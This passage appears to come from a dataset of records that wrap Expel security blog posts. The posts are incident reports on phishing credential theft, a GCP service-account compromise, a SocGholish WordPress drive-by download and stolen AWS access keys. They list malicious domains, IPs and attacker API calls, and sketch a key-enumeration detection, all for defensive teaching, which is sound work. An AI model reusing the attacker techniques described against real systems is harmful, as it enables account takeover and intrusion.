should be important to anyone providing or buying a phishing service. To accomplish this, and make the work engaging for our analysts, we use all the technology in our customers environment that Expel supports (a total of 55 different integrations) to actually investigate (yes, we look at things like EDR, netflow  gasp  and URL logs) and work to answer the questions above. Great start, but how do you take tedious work and make it scalable? If youve read our previous blog posts , youll know how strongly we believe that humans are best suited for making decisions and building relationships. Everything else (like gathering data, crunching numbers and formatting data) is better suited for technology to handle. Based on our experience doing this, we think that when you apply technology to aid humans, you should automate what you understand (not what you think), then measure and iterate. So we built technology to automate the tedious steps we knew existed.The goal of this automation is to provide the right information at the right time for the analyst to make a decision. We call this decision support (keep an eye out for a future blog on this topic). We want to make it so that our analysts can make informed decisions ( quickly ) and do what they enjoy most  finding bad guys and ruining their day. Want a breakdown of how we make decisions about phishing emails? Gon give it to ya Just like attacker tactics are constantly evolving, were continuously improving our approach for automation and decision support to help keep our analysts fresh and focused. Lets take a look at an example that was submitted for review. Phishing email example First things first: Is this email benign or malicious? We have a framework we use to train our analysts to answer this question. The framework helps break down what to think about when triaging an email. The three buckets of our phishing investigation framework are: Impersonation  Are there signs the sender is impersonating someone (is Simon really emailing our accounting department)? Is the link impersonating a legit domain (typosquatting)? Is the attachment posing as an image file when its actually a different file type altogether? Are there typos? Intent  Does the activity were seeing make logical sense (would Simon email us about an overdue invoice)? Are the indicators consistent with legit email traffic? How would an attacker benefit from this? Are they asking for sensitive information that a legitimate person or institution would already know? Action  Is the user prompted to take action? Is the subject matter financially motivated? Are they directed to click the link or download a file? Is there a sense of urgency (Is Simon demanding payment right away)? The technology weve built supports surfacing information relevant to the various themes. The first focus of our decision support was to make it fast and easy to look at the email. We safely and securely render the email and produce a PNG of the rendered email. This can tell an analyst a lot about the email. This also helps quickly eliminate things like marketing emails that were submitted for review. In addition we use third-party data enrichment to gather additional context about the sender, receiver and more. For example, were huge fans of emailrep.io and we use them to surface context on how reputable the email sender is. Below is an example of what well see in the Expel Workbench: Example of automated decision support In addition we use other services to surface context on IP , domain, information on whether file attachments are present and what the files do. All of this provides almost instant, meaningful decision support to our analysts. As we operated the service, we also noticed a lot of duplicate emails. Usually, the only thing changed might be the signature block or the sender but the overall intent of the email was unchanged. Using machine learning to find similar emails To help our analysts with answering the question of whether theyve already seen a similar email, we deployed a machine learning model that creates text embeddings of the email so that we can subsequently find semantically similar emails (if there are any) and surface those to our analysts. Example of similar email scoring Establishing a cycle of quality control checks With technology and automation comes an often overlooked responsibility of continuous quality control and improvement. We use manual quality control (QC) checks. The nice thing about QC checks is that they arent just serving the purpose of reviewing what the automation is producing; theyre also identifying new areas that can be automated. Part of our QC checks review what our analysts are doing. Are they performing repetitive tasks, tasks that are error prone or tasks that are better done by technology? If so, that could be an opportunity for automation. At Expel weve talked about some of our security operations quality checks . In building out the Expel for Phishing service we developed a separate set of quality control checks. Our structured QC process entails a daily review process to make sure the technology and analyst outcomes meet our high-quality standards. Just like the MDR service, we review a sample of phishing investigations each day to make sure that were making the right decisions and, just as important, we took the right steps to reach the conclusion. A second set of eyes can offer a unique perspective  we have made a number of feature requests based on these reviews. Were talking about things from typosquatted domains identification to formatting changes in the results to draw attention to important info. In the past 3,000 emails we analyzed, about 85 percent of them are benign (marketing emails, sales emails and generic spam). Finding ways to quickly spot and dispatch harmless emails is equally important for scaling our team. Sifting through benign emails and identifying the true threats is just the beginning of our process. This is where the real meaningful work (i.e. fun for an analyst) begins. Investigating a malicious email Like I mentioned before, while other services can tell you if an email is bad or not, we think thats not enough. We need to be able to answer those important questions (Who else received this email? Was anyone compromised?). Well, this is the part where I tell you how we get to those answers quickly. Our integrations with customer security technology via the Expel Workbench platform gives us the ability to go deeper than other phishing services and actually answer these questions. The screenshot below shows an example of an investigative step that demonstrates the way we use our customers security investment to get to answers. In this situation, the analyst confirmed that a phishing website was collecting user credentials. We wanted to see who else across the enterprise had accessed the domain. The analyst used what we call an investigative action, which asks multiple customer onboarded security technologies the same question without the analyst having to worry about the vendor specifics of how, since the platform takes care of that. Here the investigative action run was Query Domain, and the analyst looked for any evidence that a user in the enterprise visited the domain in question. In this case, the platform queried an EDR, SIEM and firewall. Then, all the results were returned for the analyst to review. Based on URL logs generated by the firewall (and a lack of SSL) the analyst could confirm that data was transferred to the website for a number of users. Abstracting away the intricacies of each technology and giving our analysts tools, like investigative actions that run across all onboarded security devices, allows them to spend their time focusing on asking and answering investigative questions. Example investigative action in Expel Workbench Quick action is key for minimizing risk. Even with our automation and platform, investigating and writing a report takes a little time. We didnt like that, so, as we investigate, we take advantage of the transparent platform to skip right to the part where we tell the customer what they need to start remediating. We give our customer security team a heads up that weve found something malicious, send them a list of the indicators of compromise (IOCs) we have at that point and recommendations to mitigate as much risk as possible. All of this uses automation and happens in a few clicks. These notifications are delivered via email, Microsoft Teams, Slack, PagerDuty or any combination the customer chooses. Expel Workbench Notification example When we do find a compromise (like a phishing email that tricked a user into submitting creds or running malware), we provide immediate notification with specific remediation actions for the additional IOCs. We know that the customer team is busy, so we provide clear steps on exactly what to do. We also make sure our analysts are available to answer any questions every step of the way. Example Findings Report How this all helps our customers One of the few things analysts, customers and attackers agree on; theres a big difference between receiving a malicious email and sharing your credentials or computer with an attacker. But identifying emails that are malicious, that no one interacted with, can quickly start to feel like busy work. And no one likes busy work. That doesnt change the fact that phishing attacks arent going away. And attackers are getting smarter. Which is why we think its good to know about the malicious emails youre getting, but the real goal is to quickly identify the malicious emails that lead to a compromise. We saw an opportunity to reconcile the need to have a pair of eyes on every email that is flagged as suspicious and giving our analysts meaningful work (and a chance to continue doing what they do best). Automation is helpful, but at some point you need to have trained human eyes on these emails,  Expel customer, Lori Temples Vice President of IT Security and Business Continuity We think Expel for Phishing solves this problem. Our goal of creating this offering was to give our customers security teams space to focus on other, more interesting tasks while we handle suspicious email submissions.'}) (input_keys={'title'}),
  Example({'title': 'Incident report: how a phishing campaign revealed BEC ...', 'url': 'https://expel.com/blog/incident-report-how-a-phishing-campaign-revealed-bec-before-exploitation/', 'date': 'Sep 7, 2022', 'contents': 'Subscribe  EXPEL BLOG Incident report: how a phishing campaign revealed BEC before exploitation Security operations  6 MIN READ  BEN SOLOWAY, TYLER WOOD, DAVID OVIATT AND HAROLD HARDING  SEP 7, 2022  TAGS: MDR Recently, our SOC witnessed just how quickly attackers can start a phish fry with the spoils of a successful campaign. I dont think anyone will be too surprised by this, but hackers dont dilly-dally. When a phishing alert sounded just after midnight EST, it first seemed like a standard fare document-sharing phish. By the time the 89th and final submission was in the bucket, we knew a large-scale campaign had successfully hit a customer. In fact, we caught a suspicious login attempt from one of the compromised accounts shortly after we detected the submission of credentials to a phishing site. Lets walk through how we triaged the alert. But a campaign is nothing new Credential harvesters are one of an attackers bread and butter initial access tactics, so no surprise so far. An initial URL redirects to a fake login portal (often Microsoft-themed), and sandbox analysis often tells us where credentials get transmitted. But this particular campaign was really large. It hit users suddenly, and unlike so many others we see, it actually worked. A couple of users got tricked into submitting credentials, and not long after, we saw those credentials used in a login attempt. So why are we talking about a large, run-of-the-mill phishing campaign? Well, this one had some interesting features, including a browser extension, multiple senders, and different initial URLs. Its a good example of things going right during triage. And finally, it demonstrates the value of automation for enriching and expediting the process. How it went down The first alert was nothing surprising. The sender was from an external account and the body of the email was basically a single image stating that someone had shared a document for review. Our phishing team is a big fan of Ruxie, one of the robots we use to automate and enrich the details of a case. Shes fantastic at parsing essential information for our analysts. This includes basics like sender addresses, reply-tos and return-paths, as well as embedded URLs in any given email body, whether in image references, hyperlinks, or text. She even runs API queries to pull back email reputation details and available Clearbit information on the sender organization. We use these pieces of information to orient ourselves to the story of each email, and then take action if needed. In this case, one of our team members reviewed the initial alert in our phishing queue, examined some of Ruxies details, and immediately knew something was phishy. The analyst moved the alert into investigation status and started inspecting key features. If we determine malicious intent, we need to know where an attacker is directing victims, so that we can use logs to determine if any users mistakenly took the bait. Well usually submit a URL to Ruxie, who integrates with a sandbox analyzer and further enriches the outcome information right from Workbench. Here, the analyst took the embedded URL and followed it to a fake document review page hosted on a Jotform domain. He clicked on the review document link and thats where things ended. The fake login portal wouldnt manifest. There are tons of reasons this might happen  most often the companies hosting the phishing content get wise to it and shut the page down. But sometimes the attackers are savvy enough to use sandbox detection mechanisms, which make IOCs a little tougher to track down. Our analyst began to fiddle with the URL to see if he could get to the goods. Meanwhile, deep in the virtual SOC, more alerts started hitting the queue. Other analysts determined quickly that these were likely malicious emails. However, as part of our orienting process, they also recognized that the first analyst was working on a submission with the same sender domain, so these were likely related. After some quick discussion, we agreed that a campaign was under way and began adding the new alerts to the investigation. Ruxie quickly picked up on this and began adding the additional submissions, freeing the team up to focus on human analysis tasks. Then another related submission hit the queue. A different sender domain, a slightly different embedded URL, nearly identical body clearly the same campaign. At this point, the alerts were coming in pretty quickly, and our initial analyst was seeing several different flavors of the same email. Another analyst jumped in to help track down IOCs and investigate whether there was evidence of compromise, and this latest email was the ticket. As far as we can tell, the bulk of the initial submissions led to pages that had already been taken down by the content-hosting platforms. But this latest one was still live, and we were able to determine exactly where credentials were being sent  an 18-day-old domain with a Canadian TLD. So we launched some Workbench queries to our customers endpoint technology to see if any successful network connections had been made to the malicious URLs and domains. Unfortunately, we started returning some results. This doesnt always mean credentials are compromised. Often well see the recipient of a phish click a link and make it as far as the fake login portal before they realize the page is bogus and close out. They then submit the phish to us for analysis, and well see those connections, but theres no evidence of compromise. However, during our sandbox analysis, we were only observing post -method requests to the new domain, and those were only after credentials were submitted to the harvester. This means any traffic to the new domain observed in the customer environment is assumed to be the submission of credentials, and thus evidence of an active compromise. Submission of credentials to an attacker constitutes an incident requiring immediate action. Because our Workbench queries were returning results, we wanted to verify them by pivoting into the endpoint tech (in this case Defender ATP) before we promoted the investigation and woke the customer up. We submitted queries for the domain to the console, and Shazam! We confirmed that two users had made successful network connections to the malicious domain via Chrome/Edge. An interesting twist on an old method Legitimate services are often employed in phishing attempts. Its nothing new to see a commonly used service in a malicious email to add a sense of legitimacy. Jotform, a legitimate file-sharing service, was abused during this attack, but the attackers used a trick we hadnt seen before. Jotform has a feature that adds an extension to the browser, and the purpose of the extension is for quick access to forms that can be managed through Jotforms premade templates. The attackers leveraged this feature to open the credential harvester in a separate window, which also acted as a bookmark to bring the user directly to the malicious login page. Threshold met. Incident created. Customer notified. At this point, the investigation was promoted to an incident and notifications were sent to the customers security team automatically. Our focus shifted to getting remediations to them as quickly as possible, with the most important task being resetting credentials. We quickly blocked the malicious domains, removed the emails, and blocked the senders. We also clarified some of our findings with the customers security team. Once the customer acknowledged our findings the incident was assigned over to them. The phishing team concluded its investigation and returned to triaging alerts as normal. Of course, this isnt quite where the story ended. A few hours later, an Azure AD Identity Protection alert fired for a risky sign-in associated with one of the compromised accounts from the phishing incident. An MDR analyst picked up the alert, and immediately realized that it was suspicious. Our analysts have a lot of options for enrichment and correlation, and a few quick searches revealed that the account was part of the phishing incident. The analyst informed the customers security team of the login attempt and quickly received confirmation that credentials for the account had already been reset. However, for tracking purposes, and to allow the customer to test some internal automation, we elevated the login alert to an incident. Some takeaways Its essential that when we promote a campaign to an incident, the customer is notified immediately so they can respond. In this case, they did take action, and thats a win, especially since it may have prevented an attackers successful login. More importantly it demonstrates redundancy of detection at its best. Our phishing team caught the successful credential harvesting and our MDR team caught the login attempt. If one had failed, the other would have caught it, and our customer would have been notified quickly either way. Thats a win as well. Well leave you with a few other thoughts for you to nosh on: If nothing else, this case serves as a reminder of just how quickly attackers can transition from stealing the keys to knocking on the front door. They arent waiting around for your weekend to be over or for you to get back from the gym. Theyre going to take action quickly. Make sure your colleagues know what to look for, and make it easy for them to report. Educate your organization. 89 submissions to Expel doesnt reveal the full scope of the campaign. It only tells us how many users saw it, were sharp enough to recognize it as a phish, and then proactively submit it as malicious. If the submitters had simply ignored the email, the phishing team obviously couldnt have recognized the compromise. Quite honestly, 89 submissions for a phishing campaign? Thats not bad. And yet With a phishing campaign this size, youre more likely to see a weak link in the organization compromised. Dont ignore a large-scale campaign. Give those IOCs a second pass because an adversary only has to succeed once. These campaigns often have slightly different URLs and redirects, but transmit credentials to the same place. Try to understand the end-goal so you can stop them.'}) (input_keys={'title'}),
  Example({'title': 'Incident report: Spotting an attacker in GCP', 'url': 'https://expel.com/blog/incident-report-spotting-an-attacker-in-gcp/', 'date': 'Jun 9, 2022', 'contents': 'Subscribe  EXPEL BLOG Incident report: Spotting an attacker in GCP Security operations  3 MIN READ  OSCAR DE LA ROSA, GIRISH MUKHI AND DAVID BLANTON  JUN 9, 2022  TAGS: Cloud security / MDR TL;DR Common cloud misconfigurations and long-lived credentials were the root cause of all cloud incidents we identified in Q1. This post details a recent Google Cloud Platform (GCP) attack on one of our customers. Key takeaways: follow least privilege principles; regenerate keys periodically; and void putting credentials in code, the source tree, or repositories. One of the most common ways we see attackers gain unauthorized access to a customers cloud environment is through publicly exposed credentials. In fact, common cloud misconfigurations and long-lived credentials were the root cause of 100% of incidents we identified in the cloud in the first quarter of 2022 (more on this in our new quarterly threat report ). Which makes it no surprise that this is exactly how an attacker gained access to a customers Google Cloud Platform (GCP) environment in our most recent cloud incident spotted by our security operations center (SOC). Once the attacker acquired credentials to a GCP service account, they attempted to create a new service account key to maintain access using the Google SDK. While the scope of the incident was small since the GCP methods failed (score one for the good guys!), we still learned a lot. In this post, well walk through how we detected it, our investigative process, and some key takeaways that can help secure your GCP environment. Initial lead and detection methodology Our initial lead was an alert for an API call to the GCP method google.iam.admin.v1.createserviceaccountkey via SDK from an atypical source IP address. When we surfaced the alert to Workbench, our friendly bot, Ruxie, enriched the source IP address with geo-location and reputation information. Turned out, the source IP address was likely a TOR exit node with a history of scanning and brute-forcing. Simply put, an API call to the GCP method google.iam.admin.v1.createserviceaccountkey via SDK from this IP address is unusual. Ruxie also provided our SOC analysts with historical context on what other activities this service account performed in GCP within a 7 day timeframe (shown below). This information enabled our SOC analysts to further confirm that its pretty unusual that a service account only performed the GCP methods google.iam.admin.v1.CreateServiceAccountKey and google.iam.admin.v1.EnableServiceAccount using the Google Cloud SDK from a TOR exit node. Based on this data from Ruxie, we believed these service account credentials were likely compromised  it was time to promote this alert to an incident. We notified the customer, escalated the activity to our SOC emergency on-call team, and began our response. Investigation and response in GCP Once we knew we had an incident on our hands, the first step was to provide the remediation action to disable the service account and reset credentials to our customer to stop the immediate threat. During this process, we answer our investigative questions: How was the GCP service account key compromised? What other GCP methods were called by this GCP service account, or its key, before and after the alerted activity? What other accounts or activities did we see from the TOR IP address in our customers environment? To answer these questions, we ran searches across the cloud and domain environment and pulled a timeline of GCP audit logs. Timeline analysis of the GCP audit logs showed that the attacker was unable to successfully create a new service account key, or enable the service account, because the compromised service account didnt have the required Identity and Access Management (IAM) permissions. After the failed GCP methods, we didnt observe any more activity from the attacker. Throughout our investigation, we didnt observe any evidence to explain how the credentials were initially compromised. This led us to believe that the credentials were likely exposed publicly. The customer ended up confirming that they were committed to a public Github repo which allowed us to implement better resilience actions for all of our customers moving forward. Lessons and takeaways Based on our experience, here are some tips and lessons learned from this incident to help you secure your GCP environment: Ensure the principle of least privilege. This hinders attackers from leveraging compromised credentials to further perform post-exploitation in the cloud. For example, the attacker in this incident was unable to perform the GCP methods to create a new service account key because we followed this principle. Regenerate your keys periodically. Its good security hygiene to rotate keys and in the event that older credentials get compromised by an attacker. Avoid putting any credentials in code, the source tree, or repositories. This helps prevent credentials from being accidentally exposed. Github has a secret scanning service that identifies security keys that were committed, and Google has a security key detection feature that you can enable. Want to learn more about how Expel can help keep your GCP environment secure? Reach out anytime.'}) (input_keys={'title'}),
  Example({'title': 'Incident report: Spotting SocGholish WordPress injection', 'url': 'https://expel.com/blog/incident-report-spotting-socgholish-wordpress-injection/', 'date': 'Jul 22, 2021', 'contents': 'Subscribe  EXPEL BLOG Incident report: Spotting SocGholish WordPress injection Security operations  5 MIN READ  TYLER FORNES, RYAN GOTT, KYLE PELLETT AND EVAN REICHARD  JUL 22, 2021  TAGS: Incident report / Managed detection and response Earlier this week, our SOC stopped a ransomware attack at a large software and staffing company. The attackers compromised the companys WordPress CMS and used the SocGholish framework to trigger a drive-by download of a Remote Access Tool (RAT) disguised as a Google Chrome update. In total, four hosts downloaded a malicious Zipped JScript file that was configured to deploy a RAT, but we were able to stop the attack before ransomware deployment and help the organization remediate its WordPress CMS. Well walk you through what happened, how we caught it, and provide recommendations on how to secure your WordPress CMS. We also hope that this story is a good reminder of the power of asking the right investigative questions . How we spotted our initial lead Around 07:00 UTC ( thats 3:00 am ET), our SOC received an EDR alert for suspicious Windows Script Host (WSH) activity on one Windows 10 host. The TL;DR is an employee double clicked a Zipped JScript file named Chrome.Update.js and EDR blocked execution. Heres what we were able to infer from our initial lead into the activity: This doesnt look like legitimate Google Chrome update activity Possible fake update activity delivered via Zipped JScript file The activity is only on this host, not prevalent, and unlikely to be a false positive The WSH process spawned from Windows Explorer, suggesting the employee double-clicked the JScript file versus part of an exploit-chain Initial lead: suspicious WSH process activity As part of our alert triage process, we did a quick check to make sure we werent seeing the WSH activity anywhere else in the environment. We werent. And EDR blocked the activity. Case closed? Nope. The quality of your SOC investigations is rooted in the questions you ask. There are two very important questions we needed to answer before calling it case closed: What does the JScript file do? How did the Zipped JScript file get there? To figure out what the JScript file does, we grabbed a copy of the Zipped JScript file and submitted it to our internal sandbox (we use VMRay at Expel). The JScript file did the following at runtime: Contacted command-and-control servers hosted at [.]services[.]accountabilitypartner[.]com (195.189.96.41) and [.]drpease[.]com Opened an HTTP POST request for /pixel.png on TCP port 443 Delivery mechanism consistent with potential SocGholish framework activity Given this info, its our opinion that /pixel.png is likely a second stage payload. We were unable to acquire a copy of /pixel.png for further analysis, but  Bottom line: its bad. Now we needed to figure out how the Zipped JScript file got there. This is where the story gets interesting. How we investigated the SocGholish WordPress injection We needed to know how the Zipped JScript file got onto the host computer. It wouldve been easy to assume, Okay, the Zipped JScript file was likely delivered via phishing and EDR is blocking the activity, so well block the C2 and move on.  Not so fast, my friend.   Lee Corso Using EDR live response features, we acquired a copy of the employees Google Chrome browser history as it could potentially contain evidence we needed to determine how the Zipped JScript file got there. The host in question is a Windows machine, so we grabbed a copy of C:Users\\AppDataLocalGoogleChromeUser DataDefaultHistory and reviewed it using internal tools. You can parse the History .db files using SQLite as well. Sure enough, Google Chrome history recorded that Chrome.Update.js was downloaded after visiting a URL hosted on the companys WordPress CMS. The companys WordPress CMS was likely compromised, resulting in delivery of fake updates that deploy the SocGholish RAT. The companys WordPress CMS is publicly accessible, so anyone visiting the site could potentially be compromised. At this point in our investigation, we declared a critical incident, notified our customer, and in parallel escalated our on-call procedure to bring in additional cavalry to aid in the investigation. Our response and remediation efforts Google Chrome history contained evidence to suggest that the malicious Zipped JScript file was downloaded after visiting a webpage on the companys WordPress site. We let our customer know that there was evidence to suggest their WordPress site was compromised and to invoke their internal Incident Response plan. We also armed the customer with information about command-and-control servers and advised them to implement blocks. Adding to the excitement, as the late night hours turned into early morning hours on the East Coast, our SOC started to receive additional EDR alerts for deployment of the malicious Zipped JScript on additional Windows 10 hosts. EDR blocked that activity as well, but we needed to get a handle on the WordPress situation quickly. Anytime wed see a download of the Zipped JScript on a new host, wed repeat our process to establish how the file got there. In each case the Zipped JScript file was downloaded after visiting the companys WordPress site. But it turned out that multiple pages on the site were compromised, not just one. This context was super important. For situational awareness, we did a quick check and noticed the company was running an older version of WordPress, 5.5.3. We didnt have endpoint visibility into the WordPress server as it was hosted by a third party. If we did, we would have wanted to establish when and how the site was compromised. We inferred that the attacker likely exploited a vulnerability in a WordPress plugin or WordPress 5.5.3. We grabbed source code of any page that was recorded as triggering a drive-by-download and got to work. We almost immediately spotted a malicious inline script on every page that triggered a drive-by download: Malicious inline script deployed to multiple pages on the companys WordPress site We let the customer know about our findings and then turned our attention towards decoding and deobfuscating the script. Most of the obfuscation consisted of base64 encoded functions and strings. With the help of the Chrome DevTools Console, we stepped through the obfuscated script and eventually landed on the following: Decoded: malicious inline script deployed to multiple WordPress pages From the decoded script above, youll see that to trigger the drive-by download, the user must be referred to the site (not referred from the same site) and be running Windows. The Zipped JScript was served from notify.aproposaussies[.]com (179.43.169.30). At the time of writing, only Kaspersky (1/87) has flagged the domain as malicious on VirusTotal. Everything is not fine. We now understand whats happening. At this point, the customer was already in the process of removing the malicious inline scripts and updating to the most recent version of WordPress. We did one last check of the environment to make sure no additional hosts downloaded the evil Zipped JScript file, checked to make sure that no hosts were talking to known C2 servers, and that no other malicious processes had executed. We asked the right questions and in doing so, figured out what happened. A quick recap: The attackers likely used the  SocGholish  framework to inject a malicious script into multiple pages on the companys WordPress site by exploiting a vulnerability in a WordPress plugin or WordPress 5.5.3. If an employee navigated to a compromised web page from a device running a Windows OS, an obfuscated inline script triggered a drive-by download of a ZIP file with an embedded Windows JScript file. The malicious JScript file was configured to enable remote access to infected hosts by communicating with command-and-control (C2) servers hosted on legitimate compromised infrastructure. That remote access is then typically used to deploy variants of the WASTEDLOCKER family of ransomware. Lessons learned and tips to prevent similar incidents WordPress security and its ecosystem has improved over the years, but its still an attack vector. Keep up to date on patches, but also: Run trusted and well-known WordPress plugins. These tend to have had more scrutiny and more focus on security. Follow a WordPress hardening guide or install a WordPress security plug-in. There are many, so choose one that is right for you. Explore implementing or updating your website Content Security Policy to block malicious scripts. MFA everything and all users. Lock down your dev and staging instances, too (including adding MFA). You need to control the entire chain of the website, not just the final site. If a third party hosts your WordPress site, have all the contact info and recovery info needed in case of an incident. Run an IR tabletop exercise where the initial entry point is your WordPress site. Remember, the quality of your SOC investigations is rooted in the questions you ask. If we didnt answer, How did it get there? we would have missed a huge finding that the companys WordPress site was compromised, resulting in drive-by downloads.'}) (input_keys={'title'}),
  Example({'title': 'Incident report: stolen AWS access keys - Expel', 'url': 'https://expel.com/blog/incident-report-stolen-aws-access-keys/', 'date': 'Jan 6, 2023', 'contents': 'Subscribe  EXPEL BLOG Incident report: stolen AWS access keys Security operations  5 MIN READ  MYLES SATTERFIELD, TYLER WOOD, TEAUNA THOMPSON, TYLER COLLINS, IAN COOPER AND NATHAN SORREL  JAN 6, 2023  TAGS: MDR What happens when attackers get their hands on a set of Amazon Web Services (AWS) access keys? Well, lets talk about it. In this post, well share how that scenario led to our security operations center (SOC), threat hunting, and detection engineering teams all working together on an incident. We love it when incidents teach us new things, helping strengthen our service delivery and keep our customer environments safe. Well walk through the entire incident step-by-step to highlight not only what caught our attention, but how we capitalized on a situation that our customers dont often see. Initial lead and detection The initial alert lead indicated authentication with a suspicious user agent. The alert message Observed Hacking Tool User agent  Kali Linux suggested that the user employed the Kali Linux operating system. Weird. A closer look at the user agent in question revealed that it was more specifically aws-cli/1.22.34 Python/3.9.11 Linux/5.15.0-kali3-amd64 botocore/1.27.84. Based on the contextual enrichment below, this AWS user account had not previously used a Kali Linux useragent within the previous two weeks. But what about the IP address associated with this activity? Ruxieour friendly bot responsible for triageautomatically pulled some information for us. We then saw that the IP was allocated to a hosting provider other than AWS, Google, or Microsoft, and also that it wasnt located in a typical area for this customer. At this point, were ready to call this an incident and let the customer know that we had something interesting on our hands. We issued remediation actions to reset credentials for the user and disable the long-term access key. Once we classified it as an incident, our next step was to see everything that the user, IP, and access key did, so we ran an AWS triage on all of them. Lets take a closer look at what Ruxie told us the user was doing. Using our AWS user enrichment workflow, we can quickly identify which IPs the user usually performs activity with and any interesting or failed AWS API calls. Here we saw three API calls: (two) list users, and one GetSendQuota (our threat hunting team will tell us why this is important). All were denied and all came from the same access key, but different user agents. Interesting. Using our leads, we scoped additional activity in the compromised environment. As noted earlier, this led to the discovery of additional AWS IAM accounts/access keys. Seven to be exact. We repeated our remediation actions for those accounts/keys. Too long; didnt read (TL;DR) The attacker gained access to the customer environment through the use of stolen long-term access keys. Scoping surrounding activity for the AWS account, we saw that the attacker was attempting to use seven different access keys and accounts. How were the AWS keys compromised? During the initial triage, we didnt find evidence of any exploited services. We turned to open-source intelligence gathering and performed some simple Google searches to see if there were any obvious candidates for exposure. Using patterns observed in the affected IAM account names, we came across a publicly exposed Postman server with access key credentials stored in the projects variables. Threat hunting While examining what was known about the newly created incident, we noticed an event type we didnt recognize: GetSendQuota. Its not one an attacker typically uses, and anomalies are interesting to hunters, so we began running queries and doing some research. What does GetSendQuota do? Who else is running that event type? Does this organization use this event commonly? Did anything else stick out as atypical? Some Googling revealed that GetSendQuota was an Amazon email service feature that provides the sending limits for the Amazon SES account. In scoping the customers historical activity, we saw that this event was called very rarely and only by a confined set of users. One of them we could eliminate easily, as it was a service account running automated tasks. The remaining users were interesting, and I noticed several error messages all interacting with the same account. Taking the access_key_id for the initial lead, we looked up what else it did. Most of that users activity was Amazon SES-related (around 95%) and we were able to find other events that stuck out as unusual. UpdateAccountSendingEnabled, specifically, seemed interesting, as it was called several times (but not excessively, and it seemed to toggle a useful service on or off). Documentation indicated that it enables or disables email sending across your entire Amazon SES account in the current AWS region. Isolating this event type in the whole environment confirmed that only six users ever employed this event type. All six overlapped with the group of users from the previous query. This gave us high confidence that all six were compromised. Subsequent queries using the observed source IP addresses for the compromised accounts led us to one more owned account. Interestingly, as we are always researching threat hunt methodologies, we ran a separate hunt against this customers data looking for common groupings of attacker events. That hunt didnt suggest that these accounts were suspicious. It was a useful exercise because it showed that these attackers were consistent in their behavior. But they werent doing things the way other bad actors did. For this attack, event prevalence and feature overlap were key to isolating all compromised accounts. This attackers focus on email infrastructure was noteworthy and has led us to compile some of these event types into a new email event buckets to hunt on in the future. Detection opportunities for stolen access keys This incident presented a unique scenario to detect against. Hopefully, all defenders in AWS are concerned about attackers stealing an access keyespecially a long-term access key. This is what keeps us defenders up at night, and is the reason digital watering holes like GitHub have warnings about making resources available to the public. The above is quite a standard scenario. However, when attackers gain access to multiple access keys, their behavior may change a little bit, giving blue teams another behavior to key on. When an attacker scores some trust material like an access key, or lands on a box (gains access to a new device) which theyre unfamiliar with, theyre likely to perform some enumeration to figure out what powers theyve gained. Enumeration of this type can be difficult to detect due to high volume events that are of little concern. Sometimes administrators and infrastructure tools like CloudFormation perform enumeration API calls multiple times a day. In this incident, we noticed the attacker performing the same enumeration activity from the same sources, with multiple access keys. Hunting through our customers environments, we found that enumeration of multiple access keys is rare. Specifically, the attacker used the API GetCallerIdentity using multiple access keys and from the same IP. GetCallerIdentity is similar to the bash command whoami and gives the attacker information about where they have landed. Since it rarely happens, is it even worth it to build a detection? Yes, absolutely, because stolen access keys are among the top vectors for initial access into an AWS environment. Key Takeaways Remediation: Deactivate the access key associated with the IAM account Using an abundance of caution, reset the AWS console password associated with the IAM account (recommended) Block the source IP address (recommended) Detections: AWS Access Key Enumeration: multiple recon API calls (GetCallerIdentity) on multiple AWS access keys from the same source IP Threat hunting: Attackers commonly have their own playbook and will keep working it. We can use that to our advantage by looking for similar activity elsewhere (or being executed by different users). We can also use this knowledge to do threat hunting audits long after the original event has been remediated. If you missed some persistence mechanism that was originally established by the attacker, you will be able to see it later if you keep looking for that playbook of events. Common activity is our best friend. Any single environment will have patterns that line up with the daily activity of its admins and users. Attackers wont know these patterns and will stand out. Knowing your organizations patterns will help you see attackers. Research and humility are key. Not all attackers are the same. Not all of them will utilize GetSendQuota. Its easy to get complacent and think you know what an attacker might doonly to observe an attack unlike any you had seen before.'}) (input_keys={'title'}),
  Example({'title': 'Instrumenting the big three managed Kubernetes ...', 'url': 'https://expel.com/blog/instrumenting-the-big-three-managed-kubernetes-offerings-with-python/', 'date': 'Apr 13, 2023', 'contents': 'Subscribe  EXPEL BLOG Instrumenting the big three managed Kubernetes offerings with Python Engineering  8 MIN READ  DAN WHALEN  APR 13, 2023  TAGS: Tech tools Weve written a lot about Kubernetes (k8s) in recent months, particularly on the need for improved security visibility . And we recently released a (first-to-market!) MDR for Kubernetes offering . Part of this journey involved overcoming a key technical challenge: whats the best way to securely access the Kubernetes API for managed offerings like Google Kubernetes Engine (GKE), Amazon Elastic Kubernetes Service (EKS), and Azure Kubernetes Service (AKS)? Each cloud provider has its own middleware, best practices, and hurdles to clear. Figuring it all out can be quite the challengeyou can end up neck-deep in documentation, some of which is outdated or inaccurate. In this post, well share what weve learned along the way and give you the tools you need to do it yourself. Why do this? This is an oversimplification, but Kubernetes is really just one big, robust, well-conceived API. It allows orchestration of workloads, but can also be employed to understand whats going on in the environment. Youve probably used (or heard of) kubectl, right? Its an incredibly useful tool, a client that interfaces with k8s APIs. If you can do it in kubectl, you could also go directly to the API to get the same information (and more). Using Kubernetes APIs opens up a plethora of use cases from automating inventory of resources, reliability monitoring, security policy checks, and even automating some detection and response activities. But to perform any of these activities you need to securely authenticate to your managed k8s provider. In the following sections, well walk you through how to do that securely for Google Cloud Platform (GCP), Microsoft Azure, and Amazon Web Services (AWS). If that sounds interesting, lets get started. Before you begin Before we get into the tech details, its important to call out a few requirements. Requirements Follow security best practices Use established patterns for each cloud provider Use existing vendor packages where possible (dont reinvent the wheel) Note Were going to focus specifically on accessing the Kubernetes API for EKS, GKE, and AKS. Were not going to cover getting network access to the Kubernetes APIthere are too many permutations to cover, so well assume you have network connectivity, whether its to a private cluster or a cluster with a public endpoint ( maybe dont do that, though ). Warning The Python recipes were sharing below are just examples. Use them for inspiration dont copy and paste them into production . What were solving for Given cloud identity and access management (IAM) credentials for GCP, Azure, and AWS, and network connectivity to a Kubernetes cluster, how can we connect to the API in a way that satisfies all of our requirements? Each cloud infrastructure provider has its own managed Kubernetes offering and access patterns have some slight differences. At a high level, what we want to accomplish looks something like this: Early on we made a key design choice: wed strongly prefer to only deal with cloud IAM credentials. Sure, technically we could create service account tokens in Kubernetes natively and use them to access the API, but this feels wrong for a few reasons: Cutting service account tokens encourages long-lived credentials as a dark pattern, and wed like to avoid this for security reasons. Using k8s service accounts means rules-based access control (RBAC) authorization must be managed entirely in Kubernetes with roles and role bindings . Wed like to avoid that wherever 